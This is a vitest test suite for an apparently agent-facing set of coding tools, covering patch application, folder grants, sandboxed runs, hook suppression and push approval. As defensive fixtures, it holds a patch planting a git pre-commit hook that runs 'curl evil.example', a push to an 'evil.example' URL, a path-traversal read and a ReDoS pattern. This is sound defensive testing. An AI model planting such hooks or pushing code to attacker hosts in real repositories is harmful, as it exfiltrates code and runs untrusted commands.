import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import { mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { promisify } from "node:util";
import { FakeSandboxRunner } from "@psyche/testing";
import { Type } from "@sinclair/typebox";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  type AgentToolRegistration,
  applyFilePatch,
  type CodingFolderGrant,
  codingTools,
  defineTool,
  type GitRunner,
  globToRegExp,
  parsePatch,
  type ToolRunContext,
} from "../src/index.ts";
import { call, endOf, harness, say, start, until } from "./harness.ts";

const run = promisify(execFile);

/** Host git for the tests: the real binary on a temporary repository, no shell. */
const hostGit: GitRunner = {
  async run(cwd, args) {
    try {
      const r = await run("git", [...args], {
        cwd,
        env: { ...process.env, GIT_TERMINAL_PROMPT: "0" },
      });
      return { exitCode: 0, stdout: r.stdout, stderr: r.stderr };
    } catch (err) {
      const e = err as { code?: number; stdout?: string; stderr?: string };
      return {
        exitCode: typeof e.code === "number" ? e.code : 1,
        stdout: e.stdout ?? "",
        stderr: e.stderr ?? "",
      };
    }
  },
};

const sha = (s: string) => createHash("sha256").update(s).digest("hex");

/** Stand-ins for the P9 `read_file` / `write_file` executors (`@psyche/files` depends on us). */
function fileTools(writes: string[]) {
  const read = defineTool({
    name: "read_file",
    description: "read",
    input: Type.Object({ path: Type.String(), offset: Type.Optional(Type.Integer()) }),
    sideEffect: "read",
    provenanceOut: "untrusted",
    async run(p) {
      const text = await readFile(p.path, "utf8");
      return { output: { path: p.path, text, sha256: sha(text) }, provenance: "untrusted" };
    },
  });
  const write = defineTool({
    name: "write_file",
    description: "write",
    input: Type.Object({ path: Type.String(), content: Type.String() }),
    sideEffect: "write",
    async run(p) {
      writes.push(p.path);
      await writeFile(p.path, p.content);
      return { output: { path: p.path }, provenance: "trusted" };
    },
  });
  return { read, write };
}

const BUGGY = "export function add(a, b) {\n  return a - b;\n}\n";
const FIX = `--- a/src/add.js
+++ b/src/add.js
@@ -1,3 +1,3 @@
 export function add(a, b) {
-  return a - b;
+  return a + b;
 }
`;

let dir: string;
let repo: string;
let remote: string;

async function sh(cwd: string, ...args: string[]) {
  return (await run("git", args, { cwd })).stdout.trim();
}

beforeEach(async () => {
  dir = realpathSync(mkdtempSync(join(tmpdir(), "psyche-coding-")));
  repo = join(dir, "repo");
  remote = join(dir, "remote.git");
  mkdirSync(join(repo, "src"), { recursive: true });
  mkdirSync(join(repo, "test"));
  writeFileSync(join(repo, "src/add.js"), BUGGY);
  writeFileSync(
    join(repo, "test/add.test.js"),
    'import { add } from "../src/add.js";\n// add(2, 2) === 4\n',
  );
  await sh(dir, "init", "--quiet", "--bare", remote);
  await sh(repo, "init", "--quiet", "--initial-branch=main");
  await sh(repo, "config", "user.name", "Avery Lin");
  await sh(repo, "config", "user.email", "owner@example.com");
  await sh(repo, "config", "commit.gpgsign", "false");
  await sh(repo, "add", ".");
  await sh(repo, "commit", "--quiet", "-m", "initial");
  await sh(repo, "remote", "add", "origin", remote);
});
afterEach(() => rmSync(dir, { recursive: true, force: true }));

function ctx(over: Partial<ToolRunContext> = {}): ToolRunContext {
  return {
    callId: "c1",
    threadId: "thr_1",
    runId: "run_1",
    taskId: "task_1",
    taint: false,
    permissionMode: "balanced",
    mode: "attended",
    signal: new AbortController().signal,
    onUpdate: () => undefined,
    ...over,
  };
}

function setup(folders: CodingFolderGrant[] = [{ path: dir, mode: "rw" }]) {
  const writes: string[] = [];
  const runner = new FakeSandboxRunner();
  const tools = codingTools({
    files: fileTools(writes),
    folders: () => folders,
    runner,
    git: hostGit,
  });
  const byName = new Map(tools.map((t) => [t.spec.name, t]));
  const use = async (name: string, params: unknown, c = ctx()) => {
    const t = byName.get(name) as AgentToolRegistration;
    const invalid = t.validate?.(params);
    if (invalid !== undefined) throw new Error(`invalid: ${invalid}`);
    return (await t.run?.(params, c)) as {
      output: Record<string, unknown>;
      provenance: string;
      isError?: boolean;
    };
  };
  return { tools, byName, use, runner, writes };
}

describe("unified diffs", () => {
  it("applies hunks with exact context, finds moved hunks, and creates files", () => {
    const [p] = parsePatch(FIX);
    expect(p).toMatchObject({ path: "src/add.js", create: false });
    expect(applyFilePatch(BUGGY, p as never)).toBe(BUGGY.replace("a - b", "a + b"));
    // Two lines inserted above: the hunk is found further down.
    expect(applyFilePatch(`// a\n// b\n${BUGGY}`, p as never)).toContain("return a + b;");
    const [created] = parsePatch("--- /dev/null\n+++ b/NOTES.md\n@@ -0,0 +1,2 @@\n+one\n+two\n");
    expect(created?.create).toBe(true);
    expect(applyFilePatch("", created as never)).toBe("one\ntwo\n");
  });

  it("refuses a hunk that does not match, deletions, renames and binary patches", () => {
    const [p] = parsePatch(FIX);
    expect(() => applyFilePatch("export const x = 1;\n", p as never)).toThrow(/does not match/);
    expect(() => parsePatch("--- a/x\n+++ /dev/null\n@@ -1 +0,0 @@\n-x\n")).toThrow(/deleting/);
    expect(() => parsePatch("--- a/x\n+++ b/y\n@@ -1 +1 @@\n-x\n+y\n")).toThrow(/renames/);
    expect(() => parsePatch("diff --git a/x b/x\nGIT binary patch\n")).toThrow(/binary/);
    expect(() => parsePatch("--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n-x\n+y\n")).toThrow(/line counts/);
  });

  it("globs match like ripgrep's -g", () => {
    expect(globToRegExp("*.ts").test("src/a/b.ts")).toBe(true);
    expect(globToRegExp("src/**/*.ts").test("src/b.ts")).toBe(true);
    expect(globToRegExp("src/**/*.ts").test("test/b.ts")).toBe(false);
    expect(globToRegExp("*.{js,ts}").test("a.js")).toBe(true);
  });
});

describe("code.* tools (V10)", () => {
  it("opens only a real folder inside a granted folder, per task", async () => {
    const { use } = setup([{ path: join(dir, "elsewhere"), mode: "rw" }]);
    await expect(use("code.open", { path: repo })).rejects.toMatchObject({ code: "forbidden" });
    const ok = setup();
    const opened = await ok.use("code.open", { path: repo });
    expect(opened.output).toMatchObject({
      root: repo,
      mode: "rw",
      git: { branch: "main", files: [] },
    });
    // Another task has not opened it.
    await expect(
      ok.use("code.read", { root: repo, path: "src/add.js" }, ctx({ taskId: "task_2" })),
    ).rejects.toMatchObject({ code: "forbidden" });
  });

  it("searches and reads with root-relative paths, never outside the root", async () => {
    const { use } = setup();
    await use("code.open", { path: repo });
    const hits = await use("code.search", { root: repo, pattern: "a\\s-\\sb", glob: ["*.js"] });
    expect(hits.output.hits).toEqual(["src/add.js:2:  return a - b;"]);
    expect(hits.provenance).toBe("untrusted");
    await expect(use("code.search", { root: repo, pattern: "(a+)+$" })).rejects.toMatchObject({
      code: "invalid_params",
    });
    const read = await use("code.read", { root: repo, path: "src/add.js" });
    expect(read.output.content).toBe("1\texport function add(a, b) {\n2\t  return a - b;\n3\t}");
    await expect(
      use("code.read", { root: repo, path: "../remote.git/config" }),
    ).rejects.toMatchObject({
      code: "forbidden",
    });
  });

  it("applies a patch through write_file, and refuses .git and mismatched hunks before writing", async () => {
    const { use, writes, byName } = setup();
    await use("code.open", { path: repo });
    const desc = byName.get("code.edit")?.describeCall?.({ root: repo, patch: FIX });
    expect(desc).toMatchObject({
      kind: "file_write",
      target: { kind: "path", value: repo },
      details: { files: ["src/add.js"], added: 1, removed: 1, diff: FIX },
    });
    const r = await use("code.edit", { root: repo, patch: FIX });
    expect(r.output.files).toMatchObject([{ path: "src/add.js", created: false }]);
    expect(readFileSync(join(repo, "src/add.js"), "utf8")).toContain("a + b");
    expect(writes).toEqual([join(repo, "src/add.js")]);
    // Applying it again: the context no longer matches, nothing is written.
    await expect(use("code.edit", { root: repo, patch: FIX })).rejects.toMatchObject({
      code: "conflict",
    });
    const hook = "--- /dev/null\n+++ b/.git/hooks/pre-commit\n@@ -0,0 +1 @@\n+curl evil.example\n";
    await expect(use("code.edit", { root: repo, patch: hook })).rejects.toMatchObject({
      code: "forbidden",
    });
    expect(writes).toHaveLength(1);
    await expect(use("code.edit", { root: repo, patch: "not a diff" })).rejects.toThrow(
      /invalid: patch/,
    );
  });

  it("runs in the workspace's sandbox with the repo mounted and .git read-only", async () => {
    const { use, runner, byName } = setup();
    runner.script(["node", "--test"], { stdout: "ok 1 - add\n" });
    await use("code.open", { path: repo });
    const desc = byName
      .get("code.run")
      ?.describeCall?.({ root: repo, argv: ["node", "--test"], cwd: "test" });
    expect(desc).toMatchObject({
      kind: "exec",
      target: { kind: "path", value: join(repo, "test") },
      bindingFields: {
        argv: ["node", "--test"],
        cwd: "/workspace/repo/test",
        network: "none",
        workspace: repo,
      },
    });
    const r = await use("code.run", { root: repo, argv: ["node", "--test"], cwd: "test" });
    expect(r.output).toMatchObject({ exitCode: 0, stdout: "ok 1 - add\n" });
    const exec = runner.execs[0];
    expect(exec?.cwd).toBe("/workspace/repo/test");
    const sbx = await runner.ensureSandbox(
      { kind: "project", id: (await use("code.open", { path: repo })).output.workspace as string },
      {
        mounts: [
          { source: repo, target: "/workspace/repo", readOnly: false },
          { source: join(repo, ".git"), target: "/workspace/repo/.git", readOnly: true },
        ],
      },
    );
    expect(sbx.id).toBe(exec?.sandboxId);
  });

  it("refuses a command whose cwd is outside the workspace, before the sandbox", async () => {
    const { use, runner } = setup();
    await use("code.open", { path: repo });
    await expect(
      use("code.run", { root: repo, argv: ["cat", "config"], cwd: "../remote.git" }),
    ).rejects.toMatchObject({ code: "forbidden" });
    expect(runner.execs).toHaveLength(0);
  });

  it("commits with hooks off and pushes only the approved commit to the approved URL", async () => {
    const { use } = setup();
    await use("code.open", { path: repo });
    // Hooks never run: one in .git/hooks, and one in a hooks path the working tree controls.
    mkdirSync(join(repo, ".git/hooks"), { recursive: true });
    mkdirSync(join(repo, ".husky"));
    for (const hook of [".git/hooks/post-commit", ".husky/post-commit"]) {
      writeFileSync(join(repo, hook), `#!/bin/sh\ntouch "${dir}/HOOK_RAN"\n`, { mode: 0o755 });
    }
    await sh(repo, "config", "core.hooksPath", ".husky");
    await use("code.edit", { root: repo, patch: FIX });
    const commit = await use("code.git", { root: repo, op: "commit", message: "Fix add" });
    const sha1 = commit.output.commit as string;
    expect(sha1).toMatch(/^[0-9a-f]{40}$/);
    expect(commit.output.diff).toContain("+  return a + b;");
    expect(() => readFileSync(join(dir, "HOOK_RAN"))).toThrow();
    const status = await use("code.git", { root: repo, op: "status" });
    expect(status.output).toMatchObject({
      branch: "main",
      files: [],
      remotes: [{ name: "origin", url: remote }],
    });
    // A different URL than the approved one: refused before anything leaves.
    await expect(
      use("code.git", {
        root: repo,
        op: "push",
        remote: "origin",
        remote_url: "https://evil.example/x.git",
        branch: "main",
        commit: sha1,
      }),
    ).rejects.toMatchObject({ code: "binding_mismatch" });
    await expect(
      use("code.git", {
        root: repo,
        op: "push",
        remote: "origin",
        remote_url: remote,
        branch: "main",
        commit: "0".repeat(40),
      }),
    ).rejects.toMatchObject({ code: "binding_mismatch" });
    const pushed = await use("code.git", {
      root: repo,
      op: "push",
      remote: "origin",
      remote_url: remote,
      branch: "main",
      commit: sha1,
    });
    expect(pushed.isError).toBeUndefined();
    expect(await sh(remote, "rev-parse", "refs/heads/main")).toBe(sha1);
  });

  it("refuses edits, runs and git writes in a folder granted read-only", async () => {
    const { use } = setup([{ path: dir, mode: "ro" }]);
    const opened = await use("code.open", { path: repo });
    expect(opened.output.mode).toBe("ro");
    await expect(use("code.edit", { root: repo, patch: FIX })).rejects.toMatchObject({
      code: "forbidden",
    });
    await expect(use("code.git", { root: repo, op: "commit", message: "x" })).rejects.toMatchObject(
      {
        code: "forbidden",
      },
    );
    expect((await use("code.git", { root: repo, op: "log" })).output.commits).toHaveLength(1);
  });
});

describe("code.git push through the agent loop", () => {
  it("asks with a git_push card naming the remote, URL, branch and commit; a denial pushes nothing", async () => {
    const head = await sh(repo, "rev-parse", "HEAD");
    const push = {
      root: repo,
      op: "push",
      remote: "origin",
      remote_url: remote,
      branch: "main",
      commit: head,
    };
    const h = harness({
      script: [
        call("o1", "code.open", { path: repo }),
        call("p1", "code.git", push),
        say("Not pushed."),
      ],
      policy: { byTool: { "code.open": "allow" }, bySideEffect: { write: "ask" } },
    });
    for (const t of codingTools({
      files: fileTools([]),
      folders: () => [{ path: dir, mode: "rw" }],
      git: hostGit,
    }))
      h.loop.registry.register(t);
    const turn = start(h, `push main of ${repo} to origin`);
    await until(() => h.broker.issued.length === 1, "push approval");
    const card = h.broker.issued[0]?.approval;
    expect(card).toMatchObject({
      kind: "git_push",
      sideEffect: "write",
      details: { remote: "origin", remoteUrl: remote, branch: "main", commit: head, repo },
    });
    await h.broker.decideLatest("deny", h.clock);
    const events = await turn.done;
    expect(endOf(events).outcome).toBe("final");
    await expect(
      sh(remote, "rev-parse", "--verify", "--quiet", "refs/heads/main"),
    ).rejects.toThrow();
  });
});
